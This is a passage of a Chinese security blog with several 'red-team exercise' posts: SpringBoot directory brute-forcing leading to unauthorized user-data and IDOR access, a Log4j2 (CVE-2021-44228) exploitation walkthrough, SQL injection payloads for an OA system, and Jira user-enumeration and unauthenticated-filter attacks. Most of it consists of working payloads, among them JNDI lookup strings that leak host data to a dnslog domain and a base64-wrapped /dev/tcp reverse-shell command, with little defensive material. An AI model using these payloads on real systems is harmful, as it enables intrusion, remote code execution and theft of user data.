<p><strong>答：</strong>这说明：还有一层目录才能够到达SpringBoot的目录！即/data_marxxx目录实际是存在的，并且它的下一层目录就是SpringBoot</p>
<ul>
<li><strong>步骤3：二级目录爆破</strong></li>
</ul>
<p>​        于是访问**/data_marxxx**并抓取GET数据包，丢在Burpsuite中进行二级目录爆破。</p>
<p><img src="/2023/08/14/404%E9%A1%B5%E9%9D%A2%E5%88%A9%E7%94%A8/image-20230814163337722.png" alt="image-20230814163337722"></p>
<p>​        放入目录字典进行Fuzz测试，这里选择使用Burpsuite的原因是，SpringBoot目录的访问报错，状态码依然是404，而使用Burpsuite的返回值Length长度，可以轻松筛选出是否成功爆破到了SpringBoot目录。</p>
<p>​        爆破URI时，需要在Burpsuite中勾掉默认的URLEncode选项：</p>
<p><img src="/2023/08/14/404%E9%A1%B5%E9%9D%A2%E5%88%A9%E7%94%A8/image-20230814163417234.png" alt="image-20230814163417234"></p>
<p>扫描结果</p>
<p><img src="/2023/08/14/404%E9%A1%B5%E9%9D%A2%E5%88%A9%E7%94%A8/image-20230814163434694.png" alt="image-20230814163434694"></p>
<ul>
<li><strong>步骤4：继续拼接url访问</strong></li>
</ul>
<p>于是：拼接访问：<strong>http://\</strong>*.com/data_marxxx/cloud/**</p>
<p><img src="/2023/08/14/404%E9%A1%B5%E9%9D%A2%E5%88%A9%E7%94%A8/image-20230814163504187.png" alt="image-20230814163504187"></p>
<p>​        发现springBooat404页面，对springBooat404页面（http://***.com/data_marxxx/cloud/）进行springBooat敏感目录扫描，运气好的话还可能有代码执行RCE、未授权访问。</p>
<ul>
<li><strong>步骤5：js文件路径拼接url访问</strong></li>
</ul>
<p>构造http://***.com/data_matxxx/cloud/user_xxxxx/user/list</p>
<p><strong>发现漏洞</strong>：未授权调用系统接口查询全部用户数据</p>
<p><img src="/2023/08/14/404%E9%A1%B5%E9%9D%A2%E5%88%A9%E7%94%A8/image-20230814163647912.png" alt="image-20230814163647912"></p>
<p>之后就顺利多了，拼接/data_marxxx/cloud/order，后面再跟一个ID参数，回显了如下数据。</p>
<p><strong>Order后可以拼参数</strong> <img src="/2023/08/14/404%E9%A1%B5%E9%9D%A2%E5%88%A9%E7%94%A8/image-20230814163711031.png" alt="image-20230814163711031"></p>
<p>需要在Cookie加入user_code参数，而user_code参数，存在于第一个漏洞的回显数据中。</p>
<p><img src="/2023/08/14/404%E9%A1%B5%E9%9D%A2%E5%88%A9%E7%94%A8/image-20230814163805089.png" alt="image-20230814163805089"></p>
<p>并且，只需Cookie就可以查询数据，并且数据编号可以全部遍历。</p>
<p><strong>于是，第二个漏洞产生：越权查询全部系统流程数据。</strong></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">Log4j2远程代码执行漏洞</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-08-14 14:24:33 / 修改时间：21:02:02" itemprop="dateCreated datePublished" datetime="2023-08-14T14:24:33+08:00">2023-08-14</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">漏洞</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">实战漏洞</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/" itemprop="url" rel="index"><span itemprop="name">攻防演练</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="攻防演练-Log4j2远程代码执行漏洞-cve-2021-44228"><a href="#攻防演练-Log4j2远程代码执行漏洞-cve-2021-44228" class="headerlink" title="攻防演练|Log4j2远程代码执行漏洞(cve-2021-44228)"></a>攻防演练|Log4j2远程代码执行漏洞(cve-2021-44228)</h1><p><strong>免责声明</strong></p>
<p>​        <strong>本文技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他违法行为</strong>。</p>
<h2 id="0x01漏洞概述"><a href="#0x01漏洞概述" class="headerlink" title="0x01漏洞概述"></a>0x01漏洞概述</h2><p>​        Apache log4j是Apache的一个开源项目，Apache log4j 2是一个就Java的日志记录工具。通过重写了log4j框架，并且引入了大量丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，被应用于业务系统开发，用于记录程序输入输出日志信息。</p>
<p><strong>漏洞所在</strong>：log4j2中存在JNDI注入漏洞，当程序记录用户输入的数据时，即可触发该漏洞。成功利用该漏洞可在目标服务器上执行任意代码。</p>
<h2 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h2><p>原理概述</p>
<ul>
<li><p>当用户输入信息时，应用程序中的log4j2组件会将信息记录到日志中</p>
</li>
<li><p>假如日志中含有该语句${jndi:ldap:192.168.96.1:1099/exp}，log4j就会去解析该信息，通过jndi的lookup()方法去解析该URL：ldap:192.168.96.1:1099/exp</p>
</li>
<li><p>解析到ldap，就会去192.168.61.129:1099的ldap服务找名为shell的资源，如果找不到就会去http服务中找</p>
</li>
<li><p>在http中找到shell之后，就会将资源信息返回给应用程序的log4j组件，而log4j组件就会下载下来，然后发现shell是一个.class文件，就会去执行里面的代码，从而实现注入</p>
</li>
<li><p>攻击者就可以通过shell实现任意的命令执行，造成严重危害</p>
</li>
</ul>
<h2 id="0x03漏洞环境或指纹"><a href="#0x03漏洞环境或指纹" class="headerlink" title="0x03漏洞环境或指纹"></a>0x03漏洞环境或指纹</h2><p><strong>Fofa：</strong>app=”Log4j2”</p>
<p><strong>漏洞条件</strong></p>
<ul>
<li>Apache Log4j 2.x &lt;= 2.14.1</li>
<li> Apache Log4j2 2.15.0-rc1（补丁绕过）</li>
<li>JDK版本小于8u191，7u201,6u211</li>
</ul>
<p>初步判断方法：</p>
<p>搜索已知 ip=”x.x.x.x” &amp;&amp; app=”Log4j2”</p>
<p>如有结果，则代表疑似有风险。</p>
<h2 id="0x04-POC-EXP-漏洞利用"><a href="#0x04-POC-EXP-漏洞利用" class="headerlink" title="0x04 POC/EXP/漏洞利用"></a>0x04 POC/EXP/漏洞利用</h2><p><strong>整个攻击链：</strong></p>
<p><strong>攻击者在漏洞点注入表达式如${jndi:ldap://xxx.xxx.xxx/exploit}</strong> </p>
<p><strong>→ 然后log4j2支持lookup（）方法</strong> </p>
<p><strong>→ log4j2支持JNDI à  ldap/rmi 远程加载攻击者服务器上的class文件构建对象（LDAP/RMI中有个命名引用功能）</strong> </p>
<p><strong>→ 寻找本地的恶意代码并执行。</strong></p>
<h3 id="Dnslog出网测试"><a href="#Dnslog出网测试" class="headerlink" title="Dnslog出网测试"></a>Dnslog出网测试</h3><p><strong>【payload】</strong></p>
<p><code>action=$&#123;jndi:ldap://X.X.X.X/exp&#125;</code></p>
<p><code>action=$&#123;jndi:ldap:// nlhkzw.dnslog.cn &#125;</code></p>
<p>​        先获取一个dnslog的子域名（ceye等平台的子域名也可以），并在靶机中进行ldap请求，获取DNSLog.cn子域名：<strong>nlhkzw.dnslog.cn</strong>。</p>
<p>​     <img src="/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814160426173.png" alt="image-20230814160426173"></p>
<p>抓包并注入payload</p>
<p><img src="/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814160521214.png" alt="image-20230814160521214"></p>
<p>对payload 进行url编码</p>
<p><img src="/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814160618760.png" alt="image-20230814160618760"></p>
<p>编码后放包</p>
<p><img src="/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814160656674.png" alt="image-20230814160656674"></p>
<p>​        在DNSLog网站成功接收到解析记录即代表存在漏洞；DNSLog.cn站点用的人多，网络慢，可以需要刷新几次或等待一会才会有回显。（有的流量检测工具会记录常见DNS网站特征，对改网站进行封禁，所以即使有漏洞也不会有回显，这种情况就需要自己搭建域名服务器检验）</p>
<p><img src="/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814160712160.png" alt="image-20230814160712160"></p>
<p><strong>通过dnslog获取java版本信息</strong></p>
<p><strong>【payload】</strong></p>
<p><code>action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;. nlhkzw.dnslog.cn &#125;</code></p>
<p><code>action=$&#123;jndi:ldap://$&#123;env:HOSTNAME&#125;. nlhkzw.dnslog.cn &#125;</code></p>
<p>执行同上操作（注入payload），回显结果</p>
<p><img src="/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814160945900.png" alt="image-20230814160945900"></p>
<h3 id="JNDI注入远程命令执行"><a href="#JNDI注入远程命令执行" class="headerlink" title="JNDI注入远程命令执行"></a>JNDI注入远程命令执行</h3><p><strong>JNDI注入工具</strong>：JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</p>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p>
<ul>
<li> <strong>生成payload</strong></li>
</ul>
<p>​        可执行程序为jar包，在命令行中运行以下命令（命令会被作为参数传入Runtime.getRuntime().exec()函数中），生成恶意的JNDI Links。</p>
<p><strong>【payload】</strong> </p>
<p><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [攻击者address]</code></p>
<p>在命令框输入如下：</p>
<p><code>root@kali：~# java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C touch /tmp/success -A **恶意服务器ip/****攻击者ip**</code></p>
<p><code>[ADDRESS] &gt;&gt; **恶意ladp/rmi****服务器ip/****攻击者ip**</code></p>
<p><code>[COMMAND] &gt;&gt; touch /tmp/success（远程执行命令）</code></p>
<p>输入完成会获取到payload，（根据靶机不同版本用不同payload）</p>
<p><img src="/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814161528633.png" alt="image-20230814161528633"></p>
<ul>
<li><strong>远程命令执行</strong></li>
</ul>
<p>​        使用JDK 1.8的链接，将其作为JNDI查询的对象，从而使得靶机（被攻击机）访问ldap服务，下载恶意的class文件。</p>
<p><img src="/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814161614950.png" alt="image-20230814161614950"></p>
<ul>
<li><p><strong>查看攻击结果</strong></p>
<p>​    被攻击电脑的/tmp/目录下会生成success文件</p>
</li>
</ul>
<h3 id="JNDI注入反弹shell"><a href="#JNDI注入反弹shell" class="headerlink" title="JNDI注入反弹shell"></a>JNDI注入反弹shell</h3><p>先验证log4j漏洞是否存在，若存在才可以利用。</p>
<ul>
<li><strong>生成payload1</strong></li>
</ul>
<p>命令执行Payload：<code>bash -i &gt;&amp; /dev/tcp/v-ip/port 0&gt;&amp;1</code></p>
<p>​        根据上述paylaod填充v-ip和端口信息，v-ip是攻击者接收反弹shell结果的ip，然后对其进行base64编码。</p>
<p> <img src="/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814161731226.png" alt="image-20230814161731226"></p>
<ul>
<li><strong>设置监听端口</strong></li>
</ul>
<p>在 v-ip中打开一个页面，监听我们的对应的端口。</p>
<p> <img src="/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814161804839.png" alt="image-20230814161804839"></p>
<ul>
<li> <strong>执行EXP，生成可用的payload</strong></li>
</ul>
<p>编码后的命令通过-C参数输入JNDI工具，通过通过-A参数指定kali的ip地址：</p>
<p><strong>【payload】</strong></p>
<p>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “bash -c {echo,<strong>payload1</strong>}|{base64,-d}|{bash,-i}” -A <strong>靶机ip（被攻击者ip）</strong></p>
<p><img src="/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814161946277.png" alt="image-20230814161946277"></p>
<ul>
<li> <strong>反弹shell</strong></li>
</ul>
<p>​         <strong>剩下的操作同远程命令执行攻击方式。使用burpsuit抓包，替换上面生成的payload</strong>，rmi://ip:1099/xz4mwn 到Burpsuite：</p>
<p><img src="/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814162123513.png" alt="image-20230814162123513"></p>
<p>Base64编码后再放包</p>
<p><img src="/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814162150589.png" alt="image-20230814162150589"></p>
<p>反弹shell成功 <img src="/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814162206545.png" alt="image-20230814162206545"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2023/08/14/%E5%90%AF%E8%8E%B1OA%E7%B3%BB%E7%BB%9FSQL%E6%B3%A8%E5%85%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/08/14/%E5%90%AF%E8%8E%B1OA%E7%B3%BB%E7%BB%9FSQL%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">启莱OA系统SQL注入</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-08-14 11:46:40 / 修改时间：21:00:55" itemprop="dateCreated datePublished" datetime="2023-08-14T11:46:40+08:00">2023-08-14</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">漏洞</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">实战漏洞</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/" itemprop="url" rel="index"><span itemprop="name">攻防演练</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="攻防演练-启莱OA系统sql注入"><a href="#攻防演练-启莱OA系统sql注入" class="headerlink" title="攻防演练|启莱OA系统sql注入"></a><strong>攻防演练|启莱OA系统sql注入</strong></h1><p><strong>免责声明</strong></p>
<p>​        <strong>本文技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他违法行为</strong>。</p>
<h2 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h2><p><strong>注入类型</strong>：报错注入；当访问出错时会将错误信息回显出来</p>
<h2 id="0x02-漏洞环境-测绘指纹"><a href="#0x02-漏洞环境-测绘指纹" class="headerlink" title="0x02 漏洞环境/测绘指纹"></a>0x02 漏洞环境/测绘指纹</h2><p>【<strong>标志</strong>】</p>
<p><img src="/2023/08/14/%E5%90%AF%E8%8E%B1OA%E7%B3%BB%E7%BB%9FSQL%E6%B3%A8%E5%85%A5/image-20230814114836016.png" alt="image-20230814114836016"></p>
<h2 id="0x03-POC-EXP-漏洞利用"><a href="#0x03-POC-EXP-漏洞利用" class="headerlink" title="0x03 POC/EXP/漏洞利用"></a>0x03 POC/EXP/漏洞利用</h2><ul>
<li><strong>注入点1：</strong></li>
</ul>
<p>http://***/client/treelist.aspx</p>
<p><strong>【payload】查看数据库名</strong></p>
<p>/client/treelist.aspx?user=’ and (select db_name())&gt;0–&amp;pwd=1</p>
<p><img src="/2023/08/14/%E5%90%AF%E8%8E%B1OA%E7%B3%BB%E7%BB%9FSQL%E6%B3%A8%E5%85%A5/image-20230814114914239.png" alt="image-20230814114914239"></p>
<ul>
<li> <strong>注入点2：</strong></li>
</ul>
<p>http://***/client/messageurl.aspx</p>
<p><strong>【payload】查看数据库名</strong></p>
<p>/client/messageurl.aspx?user=’ and (select db_name())&gt;0–&amp;pwd=1</p>
<ul>
<li> <strong>注入点3：</strong></li>
</ul>
<p>http://***/client/ CloseMsg.aspx</p>
<p><strong>【payload】查看系统版本</strong></p>
<p>/client/CloseMsg.aspx?user=’ and @@version&gt;0–&amp;</p>
<p><img src="/2023/08/14/%E5%90%AF%E8%8E%B1OA%E7%B3%BB%E7%BB%9FSQL%E6%B3%A8%E5%85%A5/image-20230814115036763.png" alt="image-20230814115036763"></p>
<ul>
<li><strong>注入点4：</strong></li>
</ul>
<p>http://***/client/ GetUser.aspx</p>
<p><strong>【payload】查看系统版本</strong></p>
<p>/client /GetUser.aspx?user=’ and @@version&gt;0–</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2023/08/14/Atlassian-Jira%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/08/14/Atlassian-Jira%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">Atlassian-Jira框架漏洞</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-08-14 10:00:17 / 修改时间：21:02:18" itemprop="dateCreated datePublished" datetime="2023-08-14T10:00:17+08:00">2023-08-14</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">漏洞</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">实战漏洞</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/" itemprop="url" rel="index"><span itemprop="name">攻防演练</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="攻防演练-Atlassian-Jira系列漏洞"><a href="#攻防演练-Atlassian-Jira系列漏洞" class="headerlink" title="攻防演练|Atlassian Jira系列漏洞"></a>攻防演练|Atlassian Jira系列漏洞</h1><p><strong>免责声明</strong></p>
<p>​        <strong>本文技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他违法行为</strong>。</p>
<h2 id="用户名枚举漏洞CVE-2020-14181"><a href="#用户名枚举漏洞CVE-2020-14181" class="headerlink" title="用户名枚举漏洞CVE-2020-14181"></a><strong>用户名枚举漏洞CVE-2020-14181</strong></h2><h3 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h3><p>【<strong>漏洞类型</strong>】信息泄露</p>
<p>Jira存在一个未授权访问漏洞，未授权的用户可以通过一个api接口直接查询到某用户名的存在情况，该接口不同于CVE-2019-8446和CVE-2019-3403的接口，是一个新的接口。如果Jira暴露在公网中，未授权用户就可以通过枚举/爆破的方式，获取用户名，回显信息会显示是否存在某个用户。</p>
<h3 id="0x02-漏洞环境-测绘指纹"><a href="#0x02-漏洞环境-测绘指纹" class="headerlink" title="0x02 漏洞环境/测绘指纹"></a>0x02 漏洞环境/测绘指纹</h3><p><strong>影响范围：</strong></p>
<ul>
<li>Jira &lt; 7.13.6</li>
<li>Jira 8.0.0 - 8.5.7</li>
<li>Jira 8.6.0 - 8.12.0</li>
</ul>
<h3 id="0x03-POC-EXP-漏洞利用"><a href="#0x03-POC-EXP-漏洞利用" class="headerlink" title="0x03 POC/EXP/漏洞利用"></a>0x03 POC/EXP/漏洞利用</h3><p>【<strong>Payload</strong>】</p>
<p><code>http://*** /secure/ViewUserHover.jspa?username=</code></p>
<ul>
<li><strong>攻击方式1：枚举</strong></li>
</ul>
<p>用户不存在</p>
<p><img src="/2023/08/14/Atlassian-Jira%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/image-20230814113617561.png" alt="image-20230814113617561">  </p>
<p>用户存在</p>
<p>（注意：下面的结果不是用中文名字枚举到的，是用中文名拼音首字母缩写枚举到的）</p>
<p><img src="/2023/08/14/Atlassian-Jira%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/image-20230814113651172.png" alt="image-20230814113651172"></p>
<ul>
<li><strong>攻击方式2：爆破</strong></li>
</ul>
<p><strong>问题</strong>：难以判断是否成功爆破出用户名</p>
<p><strong>原因</strong>： </p>
<p>\1.    不同的用户名（payload），返回的length基本都是不一样的</p>
<p>\2.    爆破成功的信息长度（length）与爆破失败的length相近，所以难以判断是否成功</p>
<p>\3.    Payload与用户名不一样，如黄<em>祥的payload是camel，并不是黄</em>祥。</p>
<p><strong>缓解办法</strong>：按长度排序，如果返回结果是中文名，一般爆破成功的长度会较大（汉字的长度较英文长）；如果是放回的是英文名字，一般爆破成功的长度会较短，因为爆破失败时会比成功多回显“用户不存在（中文/英文）”的提示。</p>
<p>然后查看响应包的“Render”，直接看回显效果。</p>
<p><img src="/2023/08/14/Atlassian-Jira%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/image-20230814113902711.png" alt="image-20230814113902711"></p>
<h2 id="Jira-Unauthenticated-Popular-Filters"><a href="#Jira-Unauthenticated-Popular-Filters" class="headerlink" title="Jira Unauthenticated Popular Filters"></a><strong>Jira Unauthenticated Popular Filters</strong></h2><h3 id="0x01-漏洞介绍-1"><a href="#0x01-漏洞介绍-1" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h3><p>​        属于未授权访问类型，可能存在若口令、任意用户注册、敏感信息泄露、任意文件上传和下载等漏洞。</p>
<h3 id="0x02-POC-EXP-漏洞利用"><a href="#0x02-POC-EXP-漏洞利用" class="headerlink" title="0x02 POC/EXP/漏洞利用"></a>0x02 POC/EXP/漏洞利用</h3><p>【<strong>payload</strong>】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#123;&#123;BaseURL&#125;&#125;&#x2F;secure&#x2F;ManageFilters.jspa?filter&#x3D;popular&amp;filterView&#x3D;popular&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>构造完整链接访问</p>
<p>​    能够看到一下人员/用户/开发者的名字与邮箱</p>
</li>
</ul>
<p><img src="/2023/08/14/Atlassian-Jira%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/image-20230814114046621.png" alt="image-20230814114046621"></p>
<ul>
<li><p>查看详情，发现需要登录</p>
<p><img src="/2023/08/14/Atlassian-Jira%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/image-20230814114125804.png" alt="image-20230814114125804"></p>
</li>
<li><p>遂注册（利用临时邮箱注册）</p>
</li>
</ul>
<p>尝试利用临时邮箱注册（TMPMAIL：<a target="_blank" rel="noopener" href="https://temp-mail.org/%EF%BC%89%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%B2%A1%E6%9C%89%E9%AA%8C%E8%AF%81%E9%82%AE%E7%AE%B1%EF%BC%8C%E4%B9%9F%E4%B8%8D%E9%9C%80%E8%A6%81%E9%82%AE%E7%AE%B1%E9%AA%8C%E8%AF%81%EF%BC%8C%E6%B3%A8%E5%86%8C%E6%88%90%E5%8A%9F%E3%80%82">https://temp-mail.org/），发现没有验证邮箱，也不需要邮箱验证，注册成功。</a></p>
<p>账号：admin，密码：admin@123</p>
<p><img src="/2023/08/14/Atlassian-Jira%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/image-20230814114146896.png" alt="image-20230814114146896"></p>
<p>​        直接进入项目管理平台，可以查看任意项目、平台开发日志（存在问题、更新模块、修改详情等）、人员信息（邮箱、工作日志等）等。</p>
<p>项目信息</p>
<p><img src="/2023/08/14/Atlassian-Jira%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/image-20230814114219738.png" alt="image-20230814114219738"></p>
<p>系统bug</p>
<p><img src="/2023/08/14/Atlassian-Jira%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/image-20230814114243036.png" alt="image-20230814114243036"></p>
<p>任意用户个人信息与活动日志</p>
